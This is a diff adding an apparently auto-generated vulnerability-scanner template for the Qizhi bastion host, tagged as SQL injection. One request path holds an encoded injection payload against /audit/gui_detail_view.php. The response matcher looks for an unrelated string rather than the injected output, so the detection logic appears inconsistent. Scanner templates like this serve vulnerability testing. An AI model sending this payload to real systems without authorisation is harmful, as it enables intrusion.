@@ -1,0 +1,22 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-qizhi-finger
+info:
+  name: "Qizhi finger"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, qizhi, ref-poc, sqlinjection]
+  description: "由参考项目脚本静态导入：Qizhi/finger（类型 SQLINJECTION）。"
+http:
+  - method: GET
+    path:
+      - "/"
+      - "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "xfpverifyExec.jsp"
